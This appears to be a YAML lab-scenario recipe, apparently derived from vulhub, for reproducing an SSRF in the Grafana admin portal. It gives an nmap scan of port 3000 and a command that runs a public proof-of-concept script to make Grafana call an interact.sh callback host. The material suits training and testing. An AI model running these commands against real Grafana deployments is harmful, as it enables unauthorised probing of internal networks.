access_instructions:
  title: Grafana Admin Portal SSRF
  steps:
  - title: Locate the target service
    instructions: |-
      Catalog TCP ports: 3000. Identify the exposed services:

      ```bash
      nmap -Pn -sT -sV -p 3000 {{NODE_IP}}
      ```

      Catalog port mappings (published → container): web: 3000/tcp → container 3000/tcp. These are recipe defaults; use the deployed service port if the scenario remaps it.

      Documented target URL(s): `http://{{NODE_IP}}:3000`.
  - title: Vulnerability Reproduce
    instructions: |-
      Use this POC: https://github.com/RandomRobbieBF/grafana-ssrf to reproduce the SSRF:

      ```
      python grafana-ssrf.py -H http://{{NODE_IP}}:3000 -u http://example.interact.sh/attack
      ```

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/grafana/admin-ssrf/1.png

      As you can see, I got the request from Grafana:

      Documentation illustration: https://github.com/vulhub/vulhub/blob/3af973a39bd0988f288a53fa9ea4b82372774e58/grafana/admin-ssrf/2.png
